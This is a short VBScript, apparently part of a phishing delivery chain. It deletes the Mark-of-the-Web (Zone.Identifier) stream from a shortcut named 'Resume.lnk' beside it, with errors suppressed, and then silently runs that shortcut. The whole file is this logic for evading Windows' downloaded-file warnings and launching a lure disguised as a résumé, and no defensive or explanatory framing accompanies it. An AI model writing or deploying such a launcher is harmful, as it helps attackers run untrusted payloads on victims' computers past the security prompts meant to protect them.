Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
lnkPath = scriptPath & "\Resume.lnk"
zonePath = lnkPath & ":Zone.Identifier"

On Error Resume Next
Set objZone = objFSO.GetFile(zonePath)
If Not objZone Is Nothing Then
    objFSO.DeleteFile zonePath, True
End If
On Error Goto 0

objShell.Run Chr(34) & lnkPath & Chr(34), 1, False